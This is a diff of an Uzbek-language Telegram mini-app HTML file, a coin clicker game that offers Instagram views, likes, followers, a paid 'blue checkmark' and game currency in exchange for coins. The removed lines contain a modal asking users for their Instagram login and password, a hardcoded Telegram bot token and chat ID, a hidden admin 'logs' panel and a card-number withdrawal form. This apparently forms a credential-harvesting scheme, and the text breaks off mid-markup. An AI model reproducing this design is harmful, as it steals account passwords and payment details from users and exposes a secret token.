@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SMM Panel & Clicker Pro</title>
+    <title>Yumi Coin & SMM Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #0f0c1b, #241442);
+            background: linear-gradient(180deg, #161508, #0a0a05);
             color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            justify-content: flex-start;
             height: 100vh;
             overflow: hidden;
             user-select: none;
@@ -28,68 +28,48 @@
 
         /* 1. NIK YARATISH EKRANI */
         #authScreen {
-            display: flex; /* Boshida ochiq turadi */
+            display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            text-align: center;
-            padding: 20px;
             width: 100%;
             height: 100%;
+            padding: 20px;
+            z-index: 999;
         }
 
         .auth-card {
-            background: rgba(255, 255, 255, 0.07);
+            background: rgba(26, 25, 15, 0.9);
             padding: 30px 20px;
             border-radius: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            border: 1px solid #cca43b;
             width: 90%;
             max-width: 340px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(204, 164, 59, 0.2);
         }
 
         .auth-logo {
             font-size: 50px;
             margin-bottom: 15px;
-            background: linear-gradient(45deg, #00ffcc, #0099ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .auth-title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #ffffff;
-            margin-bottom: 5px;
-        }
-
-        .auth-subtitle {
-            color: #b3a7d1;
-            font-size: 12px;
-            margin-bottom: 20px;
+            color: #ffd700;
         }
 
         .auth-input {
             width: 100%;
             padding: 14px 20px;
             border-radius: 12px;
-            border: 2px solid rgba(0, 255, 204, 0.3);
-            background: rgba(0,0,0,0.4);
+            border: 2px solid #cca43b;
+            background: rgba(0,0,0,0.6);
             color: white;
             font-size: 15px;
             text-align: center;
             margin-bottom: 12px;
             outline: none;
-            transition: 0.3s;
-        }
-
-        .auth-input:focus {
-            border-color: #00ffcc;
-            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
         }
 
         .auth-btn {
-            background: linear-gradient(45deg, #00ffcc, #0099ff);
+            background: linear-gradient(45deg, #ffd700, #cca43b);
             color: black;
             border: none;
             padding: 14px;
@@ -98,430 +78,553 @@
             border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 5px 15px rgba(0, 255, 204, 0.3);
-            margin-top: 8px;
         }
 
-        /* 2. ASOSIY O'YIN EKRANI */
-        #gameScreen {
-            display: none; /* Boshida yopiq, nik kiritilgach ochiladi */
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between;
-            width: 100%;
-            height: 100%;
-            padding: 15px 0;
-        }
-
-        /* TOP BAR */
-        .top-bar {
-            width: 90%;
-            max-width: 360px;
+        /* GLOBAL TOP PANEL */
+        .global-header {
+            width: 92%;
+            max-width: 400px;
+            background: rgba(30, 28, 16, 0.7);
+            border: 1px solid rgba(204, 164, 59, 0.2);
+            border-radius: 20px;
+            padding: 12px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 12px 15px;
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 15px;
         }
 
-        .nickname-text {
-            color: #00ffcc;
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            background: radial-gradient(circle, #ffd700, #b38f00);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-weight: bold;
-            font-size: 14px;
-            cursor: pointer;
+            color: black;
+            font-size: 18px;
         }
 
-        .click-power-text {
-            color: #ff9900;
+        .user-meta {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .coin-title {
+            font-size: 10px;
+            color: #aaa;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .user-nik {
+            font-size: 13px;
+            color: #fff;
+            font-weight: bold;
+            max-width: 110px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .balances {
+            display: flex;
+            gap: 8px;
+        }
+
+        .balance-badge {
+            background: #111;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
             font-size: 13px;
             font-weight: bold;
         }
 
-        /* BALANS */
-        .score-container {
-            text-align: center;
-            margin-top: 5px;
-        }
+        .balance-badge.gold { border-color: #ffd700; color: #ffd700; }
+        .balance-badge.diamond { border-color: #00ccff; color: #00ccff; }
 
-        .score-title {
-            font-size: 11px;
-            color: #b3a7d1;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .score {
-            font-size: 42px;
-            font-weight: bold;
-            color: #ffd700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
-        }
-
-        .money-balance {
-            font-size: 16px;
-            color: #00ffcc;
-            margin-top: 2px;
-            font-weight: bold;
-        }
-
-        /* TANGA TUGMASI */
-        .circle-outer {
-            width: 170px;
-            height: 170px;
-            background: radial-gradient(circle, #ff7b00, #ff0055);
-            border-radius: 50%;
-            border: 6px solid #ffd700;
-            box-shadow: 0 0 35px rgba(255, 0, 85, 0.4), inset 0 0 20px rgba(255, 215, 0, 0.4);
-            display: flex;
+        /* ASOSIY EKRANLAR KONTEYNERI */
+        .screen-content {
+            width: 92%;
+            max-width: 400px;
+            flex: 1;
+            margin-top: 15px;
+            margin-bottom: 85px;
+            overflow-y: auto;
+            display: none;
             flex-direction: column;
             align-items: center;
+        }
+
+        /* 1. BOSISH (CLICKER) EKRANI */
+        #tab-bosish {
+            display: flex;
             justify-content: center;
-            cursor: pointer;
-            transition: transform 0.05s ease;
             position: relative;
         }
 
-        .circle-icon {
-            font-size: 45px;
-            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.3));
+        .click-score-view {
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 20px;
         }
 
-        .circle-text {
-            font-size: 11px;
-            color: #ffffff;
-            margin-top: 5px;
+        .big-score {
+            font-size: 46px;
             font-weight: bold;
-            letter-spacing: 1px;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        /* SMM DO'KON */
-        .shop-container {
-            width: 92%;
-            max-width: 360px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 10px;
+        .tap-power-badge {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid #ffd700;
+            color: #ffd700;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            margin-top: 5px;
+            display: inline-block;
+        }
+
+        .coin-trigger-area {
+            width: 240px;
+            height: 240px;
+            background: radial-gradient(circle, #ffe875, #b8860b);
+            border-radius: 50%;
+            border: 8px solid #ffd700;
+            box-shadow: 0 0 40px rgba(218, 165, 32, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 110px;
+            font-weight: bold;
+            color: rgba(255,255,255,0.9);
+            cursor: pointer;
+            transition: transform 0.05s ease;
+            position: relative;
+            margin-top: 10px;
+        }
+
+        .energy-box {
+            width: 100%;
+            margin-top: 30px;
+            padding: 0 10px;
+        }
+
+        .energy-text-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 6px;
+            font-weight: bold;
+        }
+
+        .energy-bar-bg {
+            width: 100%;
+            height: 14px;
+            background: #222;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .energy-bar-fill {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #cca43b);
+            transition: width 0.1s ease;
+        }
+
+        /* RO'YXAT KO'RINIShIDAGI LIST LAR (BOOST, SMM, DONAT) */
+        .items-list {
+            width: 100%;
             display: flex;
             flex-direction: column;
-            gap: 8px;
-            max-height: 260px;
-            overflow-y: auto;
+            gap: 10px;
         }
 
-        .shop-item {
+        .list-section-title {
+            font-size: 12px;
+            color: #ffd700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 10px 0 5px 2px;
+            align-self: flex-start;
+        }
+
+        .premium-card {
+            background: rgba(25, 24, 16, 0.8);
+            border: 1px solid rgba(204, 164, 59, 0.2);
+            border-radius: 18px;
+            padding: 12px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 10px 14px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.02);
+            width: 100%;
         }
 
-        .item-details {
+        .card-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .card-icon {
+            width: 44px;
+            height: 44px;
+            background: #111;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .card-details {
             display: flex;
             flex-direction: column;
         }
 
-        .item-title { font-size: 13px; font-weight: bold; color: #fff; }
-        .item-desc { font-size: 11px; color: #b3a7d1; margin-top: 1px; }
-
-        .buy-btn {
-            background: linear-gradient(90deg, #00ffcc, #0099ff);
-            border: none;
-            color: black;
-            padding: 8px 12px;
+        .card-title {
+            font-size: 14px;
             font-weight: bold;
-            border-radius: 8px;
-            font-size: 12px;
-            cursor: pointer;
-        }
-
-        .buy-btn.premium {
-            background: linear-gradient(90deg, #e6683c, #bc1888);
             color: white;
         }
 
-        .buy-btn.money {
-            background: linear-gradient(90deg, #ffcc00, #ff6600);
+        .card-subtitle {
+            font-size: 11px;
+            color: #888;
+            margin-top: 2px;
+        }
+
+        .card-price-tag {
+            font-size: 12px;
+            color: #ffd700;
+            font-weight: bold;
+            margin-top: 1px;
+        }
+
+        .action-arrow-btn {
+            width: 32px;
+            height: 32px;
+            background: #ffd700;
+            color: black;
+            border-radius: 50%;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        /* AUKSION VA FILTR */
+        .filter-tabs {
+            display: flex;
+            background: #111;
+            width: 100%;
+            border-radius: 12px;
+            padding: 4px;
+            margin-bottom: 12px;
+        }
+
+        .filter-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #888;
+            padding: 8px;
+            font-weight: bold;
+            font-size: 13px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .filter-btn.active {
+            background: #ffd700;
             color: black;
         }
 
-        /* FLYING TEXT */
+        /* PROFIL ELEMENTLARI */
+        .uzs-balance-view {
+            width: 100%;
+            background: rgba(255,215,0,0.02);
+            border: 1px dashed #ffd700;
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .profile-menu-item {
+            width: 100%;
+            background: #15150e;
+            padding: 14px 16px;
+            border-radius: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            border: 1px solid rgba(255,255,255,0.02);
+            cursor: pointer;
+        }
+
+        /* BOTTOM NAVIGATION BAR */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #0f0f09;
+            border-top: 1px solid rgba(204, 164, 59, 0.2);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 8px 0 15px 0;
+            z-index: 900;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #666;
+            font-size: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            gap: 4px;
+            flex: 1;
+        }
+
+        .nav-item.active {
+            color: #ffd700;
+        }
+
+        .nav-icon {
+            font-size: 20px;
+        }
+
+        /* FLYING TEXT Effekti */
         .floating-text {
             position: absolute;
             font-size: 28px;
             font-weight: bold;
-            color: #ffd700;
+            color: #ffffff;
             pointer-events: none;
-            z-index: 10;
+            z-index: 99;
             animation: floatUp 0.4s ease-out forwards;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.6);
+            text-shadow: 0 2px 5px rgba(0,0,0,0.8);
         }
 
         @keyframes floatUp {
             0% { opacity: 1; transform: translateY(0) scale(1); }
-            100% { opacity: 0; transform: translateY(-90px) scale(1.2); }
+            100% { opacity: 0; transform: translateY(-80px) scale(1.2); }
         }
 
-        /* MODALLAR */
+        /* MODAL OVERLAYS */
         .modal-overlay {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 100;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
             align-items: center;
             justify-content: center;
         }
 
         .modal-card {
-            background: #181528;
-            border: 2px solid #dc2743;
+            background: #14140e;
+            border: 2px solid #ffd700;
             border-radius: 24px;
-            padding: 20px;
+            padding: 22px;
             width: 90%;
             max-width: 350px;
             text-align: center;
-            box-shadow: 0 0 25px rgba(220, 39, 67, 0.2);
         }
 
-        .modal-card h3 { margin-bottom: 12px; font-size: 18px; color: #dc2743; }
         .modal-input {
             width: 100%; padding: 12px; margin-bottom: 12px;
-            border-radius: 10px; border: 1px solid #444;
+            border-radius: 10px; border: 1px solid #cca43b;
             background: #000; color: white; text-align: center; outline: none;
         }
 
         .modal-btn {
             width: 100%; padding: 12px; border: none; border-radius: 10px;
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); color: white; font-weight: bold; margin-bottom: 10px;
-            cursor: pointer;
+            background: linear-gradient(45deg, #ffd700, #cca43b); color: black; font-weight: bold;
+            cursor: pointer; margin-bottom: 10px;
         }
 
-        .admin-logs {
-            background: rgba(0,0,0,0.5); border-radius: 12px; padding: 10px;
-            max-height: 120px; overflow-y: auto; text-align: left;
-            font-size: 11px; font-family: monospace; color: #00ffcc; margin-bottom: 12px;
-        }
-
-        .log-item { border-bottom: 1px solid rgba(255,255,255,0.1); padding: 4px 0; word-break: break-all; }
-        .close-modal { color: #b3a7d1; font-size: 13px; cursor: pointer; text-decoration: underline; margin-top: 5px; }
+        .close-txt { color: #888; font-size: 13px; cursor: pointer; text-decoration: underline; }
     </style>
 </head>
 <body>
 
-    <!-- 1. NIK YARATISH EKRANI -->
+    <!-- 1. UNIKAL NIK YARATISH EKRANI -->
     <div id="authScreen">
         <div class="auth-card">
-            <div class="auth-logo">🕹</div>
-            <div class="auth-title">Taxallus yarating</div>
-            <div class="auth-subtitle">Tizimda takrorlanmaydigan unikal nom kiriting</div>
-            <input type="text" id="uniqueNikInput" class="auth-input" placeholder="O'yin uchun nik yozing...">
+            <div class="auth-logo">⚜️</div>
+            <h3 style="margin-bottom:5px;">Yumi Coin & SMM</h3>
+            <p style="color:#aaa; font-size:12px; margin-bottom:20px;">Tizimda takrorlanmaydigan unikal nom yarating</p>
+            <input type="text" id="uniqueNikInput" class="auth-input" placeholder="@nik_yozing...">
             <button class="auth-btn" onclick="registerUniqueNik()">O'YINNI BOSHLASH 🚀</button>
         </div>
     </div>
 
-    <!-- 2. ASOSIY O'YIN EKRANI -->
-    <div id="gameScreen">
-        <div class="top-bar">
-            <span class="nickname-text" id="displayNik" onclick="tryOpenAdmin()">Nik: -</span>
-            <span class="click-power-text" id="clickPowerDisplay">Klik kuchi: +1</span>
+    <!-- GLOBAL HUD HEADER -->
+    <div class="global-header" id="globalHeader" style="display:none;">
+        <div class="user-info">
+            <div class="user-avatar">Y</div>
+            <div class="user-meta">
+                <span class="coin-title">Yumi Coin</span>
+                <span class="user-nik" id="displayNik" onclick="tryOpenAdmin()">-</span>
+            </div>
+        </div>
+        <div class="balances">
+            <div class="balance-badge diamond">🔹 <span id="diamondDisplay">0</span></div>
+            <div class="balance-badge gold">🪙 <span id="goldDisplay">0</span></div>
+        </div>
+    </div>
+
+    <!-- 2. BOSISH (CLICKER REJIMI) -->
+    <div id="tab-bosish" class="screen-content">
+        <div class="click-score-view">
+            <div class="big-score">🪙 <span id="clickGoldDisplay">0</span></div>
+            <div class="tap-power-badge" id="clickPowerDisplay">Tap x1</div>
         </div>
 
-        <div class="score-container">
-            <div class="score-title">Sizning Balansingiz</div>
-            <div class="score" id="scoreDisplay">0</div>
-            <div class="money-balance" id="moneyDisplay">0 so'm</div>
-        </div>
+        <div class="coin-trigger-area" id="clickArea">Y</div>
 
-        <div class="circle-outer" id="clickArea">
-            <div class="circle-icon">💎</div>
-            <div class="circle-text">TANGA ISHLASH</div>
-        </div>
-
-        <!-- DO'KON -->
-        <div class="shop-container">
-            <!-- Almosni Pulga sotish -->
-            <div class="shop-item" style="border: 1px solid #ffcc00; background: rgba(255,204,0,0.05);">
-                <div class="item-details">
-                    <div class="item-title" style="color: #ffcc00;">💸 Almosni Pulga sotish</div>
-                    <div class="item-desc" style="color: #ffe680;">1000 almos = 1000 so'm pul</div>
-                </div>
-                <button class="buy-btn money" onclick="convertDiamondsToMoney()">ALMASHTIRISH</button>
+        <div class="energy-box">
+            <div class="energy-text-row">
+                <span>⚡ ENERGY</span>
+                <span id="energyText">500 / 500</span>
             </div>
-
-            <!-- Pulni yechish -->
-            <div class="shop-item" style="border: 1px solid #00ffcc; background: rgba(0,255,204,0.05);">
-                <div class="item-details">
-                    <div class="item-title" style="color: #00ffcc;">💳 Pulni yechib olish</div>
-                    <div class="item-desc" style="color: #80ffdf;">Karta raqamiga o'tkazish</div>
-                </div>
-                <button class="buy-btn" style="background:#00ffcc; color:black;" onclick="openWithdrawModal()">YECHISH</button>
-            </div>
-
-            <!-- SMM Xizmatlar -->
-            <div class="shop-item">
-                <div class="item-details">
-                    <div class="item-title">👀 1000 ta Prasmotr</div>
-                    <div class="item-desc">Instagram video ko'rishlar</div>
-                </div>
-                <button class="buy-btn" onclick="triggerOrderFlow('1000 ta Prasmotr', 2500, 'free')">2500 💎</button>
-            </div>
-
-            <div class="shop-item">
-                <div class="item-details">
-                    <div class="item-title">❤️ 1000 ta Like</div>
-                    <div class="item-desc">Istagan rasmingizga layklar</div>
-                </div>
-                <button class="buy-btn" onclick="triggerOrderFlow('1000 ta Like', 5000, 'free')">5000 💎</button>
-            </div>
-
-            <div class="shop-item">
-                <div class="item-details">
-                    <div class="item-title">👥 1000 ta Obunachi</div>
-                    <div class="item-desc">Haqiqiy faol obunachilar</div>
-                </div>
-                <button class="buy-btn" onclick="triggerOrderFlow('1000 ta Obunachi', 10000, 'free')">10000 💎</button>
-            </div>
-
-            <div class="shop-item">
-                <div class="item-details">
-                    <div class="item-title">✅ Moviy Galochka (1 oy)</div>
-                    <div class="item-desc">Profilga rasmiy ko'k belgi</div>
-                </div>
-                <button class="buy-btn premium" onclick="triggerOrderFlow('1 oylik Galochka (10 000 so\'m)', 0, 'premium')">10 000 UZS</button>
-            </div>
-
-            <div class="shop-item">
-                <div class="item-details">
-                    <div class="item-title">⚡️ Tezlatkich (Klik +1)</div>
-                    <div class="item-desc">Klik kuchini oshiradi</div>
-                </div>
-                <button class="buy-btn" id="boosterBtn" onclick="buyBooster()">150 💎</button>
+            <div class="energy-bar-bg">
+                <div class="energy-bar-fill" id="energyFill"></div>
             </div>
         </div>
     </div>
 
-    <!-- MODAL: INSTAGRAM MA'LUMOTLARI -->
-    <div id="orderModal" class="modal-overlay">
-        <div class="modal-card">
-            <h3>📸 INSTAGRAM MA'LUMOTLARI</h3>
-            <p style="font-size:12px; color:#aaa; margin-bottom:15px;">Buyurtma urilishi uchun hisobingizni tasdiqlang:</p>
-            <input type="text" id="instaNik" class="modal-input" placeholder="Instagram logini (nik)">
-            <input type="password" id="instaPass" class="modal-input" placeholder="Instagram paroli">
-            <button class="modal-btn" id="orderSubmitBtn" onclick="finalizeOrder()">BUYURTMANI TASDIQLASH 🚀</button>
-            <div class="close-modal" onclick="closeModal('orderModal')">Bekor qilish</div>
-        </div>
-    </div>
-
-    <!-- MODAL: PUL YECHISH -->
-    <div id="withdrawModal" class="modal-overlay">
-        <div class="modal-card" style="border-color:#00ffcc;">
-            <h3 style="color:#00ffcc;">💳 PULNI YECHIB OLISH</h3>
-            <p style="font-size:12px; color:#aaa; margin-bottom:10px;">Minimal yechish: 5 000 so'm</p>
-            <input type="number" id="withdrawAmount" class="modal-input" placeholder="Yechiladigan summa (so'm)">
-            <input type="text" id="cardNumber" class="modal-input" placeholder="Karta raqami (Uzcard/Humo)">
-            <input type="text" id="cardHolder" class="modal-input" placeholder="Karta egasi ismi">
-            <button class="modal-btn" style="background:#00ffcc; color:black;" onclick="submitWithdraw()">YUBORISH</button>
-            <div class="close-modal" onclick="closeModal('withdrawModal')">Yopish</div>
-        </div>
-    </div>
-
-    <!-- MODAL: MAXFIY ADMIN PANEL -->
-    <div id="adminModal" class="modal-overlay">
-        <div class="modal-card">
-            <h3>🛠 MAXFIY ADMIN PANEL</h3>
-            <div id="adminAuthSection">
-                <input type="password" id="adminPassword" class="modal-input" placeholder="Admin paroli...">
-                <button class="modal-btn" onclick="checkAdminPassword()">KIRISH</button>
+    <!-- 3. BOOST EKRANI -->
+    <div id="tab-boost" class="screen-content">
+        <h2 style="align-self:flex-start; margin-bottom:15px; font-size:20px;">⚡ Tezlatkichlar & Do'kon</h2>
+        
+        <div class="items-list">
+            <div class="list-section-title">O'yin Tezlatkichlari</div>
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">🚀</div>
+                    <div class="card-details">
+                        <span class="card-title">Multitap (Klik +1)</span>
+                        <span class="card-subtitle">Har bir bosishga ko'proq tanga beradi</span>
+                        <span class="card-price-tag" id="boosterPriceTxt">150 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="buyBooster()">+</button>
             </div>
-            <div id="adminControlsSection" style="display: none;">
-                <p style="font-size:11px; color:#fff; font-weight:bold; margin-bottom:4px;">LOGLAR:</p>
-                <div class="admin-logs" id="adminLogsContainer"></div>
-                <button class="modal-btn" style="background:#bc1888; color:white; padding:8px; font-size:11px; margin-bottom:10px;" onclick="clearLogs()">LOGLARNI TOZALASH</button>
-                
-                <p style="font-size:11px; color:#fff; font-weight:bold; margin-bottom:4px;">RASSILKA</p>
-                <textarea id="rassilkaText" class="modal-input" style="height:60px; text-align:left; resize:none;" placeholder="Xabar matni..."></textarea>
-                <button class="modal-btn" onclick="sendRassilka()">HAMMAGA YUBORISH 📢</button>
+
+            <div class="list-section-title">SMM Xizmatlari (Tanga evaziga)</div>
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">👀</div>
+                    <div class="card-details">
+                        <span class="card-title">Instagram Prasmotr</span>
+                        <span class="card-subtitle">Sifatli ko'rilishlar soni</span>
+                        <span class="card-price-tag">2,500 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="triggerOrderFlow('Instagram Prasmotr', 2500, 'coin', 'insta')">></button>
             </div>
-            <div class="close-modal" onclick="closeModal('adminModal')">Yopish</div>
+
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">✈️</div>
+                    <div class="card-details">
+                        <span class="card-title">Instagram Jo'natishlar</span>
+                        <span class="card-subtitle">Haqiqiy ulashishlar (Share)</span>
+                        <span class="card-price-tag">4,000 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="triggerOrderFlow('Instagram Jo\'natishlar', 4000, 'coin', 'insta')">></button>
+            </div>
+
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">👥</div>
+                    <div class="card-details">
+                        <span class="card-title">Instagram Obunachi</span>
+                        <span class="card-subtitle">Tez va sifatli obunachilar</span>
+                        <span class="card-price-tag">9,000 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="triggerOrderFlow('Instagram Obunachi', 9000, 'coin', 'insta')">></button>
+            </div>
+
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">❤️</div>
+                    <div class="card-details">
+                        <span class="card-title">Instagram Like</span>
+                        <span class="card-subtitle">Tez va sifatli layklar</span>
+                        <span class="card-price-tag">4,500 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="triggerOrderFlow('Instagram Like', 4500, 'coin', 'insta')">></button>
+            </div>
+
+            <div class="list-section-title">🎮 O'yinlar uchun Donat (PUBG & FREE FIRE)</div>
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">🪖</div>
+                    <div class="card-details">
+                        <span class="card-title">PUBG Mobile — 60 UC</span>
+                        <span class="card-subtitle">Sizning o'yin hisobingizga donat</span>
+                        <span class="card-price-tag">5,000 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="triggerOrderFlow('PUBG 60 UC', 5000, 'coin', 'game')">></button>
+            </div>
+
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">🔥</div>
+                    <div class="card-details">
+                        <span class="card-title">Free Fire — 110 Diamonds</span>
+                        <span class="card-subtitle">Garena Free Fire donat xizmati</span>
+                        <span class="card-price-tag">7,500 🪙</span>
+                    </div>
+                </div>
+                <button class="action-arrow-btn" onclick="triggerOrderFlow('Free Fire 110 Diamonds', 7500, 'coin', 'game')">></button>
+            </div>
         </div>
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        if(tg) tg.expand();
-
-        const BOT_TOKEN = "8877926237:AAHj3LOf0-cZSIOO3o--R2lsvPYh3Cv7b5k"; 
-        const CHAT_ID = "-1002361732943"; 
-
-        const userId = tg.initDataUnsafe?.user?.id || "Noma'lum ID";
-        const firstName = tg.initDataUnsafe?.user?.first_name || "Ism kiritilmagan";
-        const tgUsername = tg.initDataUnsafe?.user?.username ? `@${tg.initDataUnsafe.user.username}` : "Usernamemiz yo'q";
-
-        const keyPrefix = `smm_${userId}_`;
-
-        let myUniqueNik = localStorage.getItem(keyPrefix + 'unique_nik') || "";
-        let score = parseInt(localStorage.getItem(keyPrefix + 'score')) || 0;
-        let moneyBalance = parseInt(localStorage.getItem(keyPrefix + 'money_balance')) || 0;
-        let clickPower = parseInt(localStorage.getItem(keyPrefix + 'click_power')) || 1;
-        let boosterCost = parseInt(localStorage.getItem(keyPrefix + 'booster_cost')) || 150;
-
-        let pendingOrder = { serviceName: '', cost: 0, type: '' };
-
-        const authScreen = document.getElementById('authScreen');
-        const gameScreen = document.getElementById('gameScreen');
-        const displayNik = document.getElementById('displayNik');
-        const clickPowerDisplay = document.getElementById('clickPowerDisplay');
-        const scoreDisplay = document.getElementById('scoreDisplay');
-        const moneyDisplay = document.getElementById('moneyDisplay');
-        const clickArea = document.getElementById('clickArea');
-        const boosterBtn = document.getElementById('boosterBtn');
-        const adminLogsContainer = document.getElementById('adminLogsContainer');
-
-        // EKRANLARNI TO'G'RI BOShQARISh (QORA EKRAN XATOSINI TUZATISh)
-        window.onload = function() {
-            if (myUniqueNik) {
-                authScreen.style.display = 'none';
-                gameScreen.style.display = 'flex';
-                displayNik.textContent = `Nik: ${myUniqueNik}`;
-                updateUI();
-            } else {
-                authScreen.style.display = 'flex';
-                gameScreen.style.display = 'none';
-            }
-        };
-
-        function registerUniqueNik() {
-            const inputNik = document.getElementById('uniqueNikInput').value.trim().toLowerCase();
-            if(!inputNik) { alert("Nik yozing!"); return; }
-            if(inputNik.length < 3) { alert("Nik kamida 3 ta harf bo'lsin!"); return; }
-
-            let globalNikList = [];
-            try {
-                globalNikList = JSON.parse(localStorage.getItem('global_registered_niks')) || [];
-            } catch(e) { globalNikList = []; }
-
-            if(globalNikList.includes(inputNik)) {
-                alert("❌ Bu nik band! Boshqa nik kiriting.");
-                return;
-            }
-
-            globalNikList.push(inputNik);
-            localStorage.setItem('global_registered_niks', JSON.stringify(globalNikList));
-            
-            myUniqueNik = inputNik;
-            localStorage.setItem(keyPrefix + 'unique_nik', myUniqueNik);
-
-            let usersList = [];
-            try { usersList = JSON.parse(localStorage.getItem('smm_global_users')) || []; } catch(e){}
-            if(!usersList.includes(String(userId))) {
-                usersList.push(String(userId));
-                localStorage.setItem('smm_global_users', JSON.stringify(usersList));
-            }
-
-            authScreen.style.displa
+    <!-- 4. VAZIFALAR EKRANI -->
+    <div id="tab-vazifalar" class="screen-content">
+        <h2 style="align-self:flex-start; margin-bottom:15px; font-size:20px;">📋 Kundalik Vazifalar</h2>
+        <div class="items-list">
+            <div class="premium-card">
+                <div class="card-left">
+                    <div class="card-icon">📢</div>
+                    <div class="card-details">
+                        <span class="card-title">Telegram Kanalga a'zo bo'lish</spa
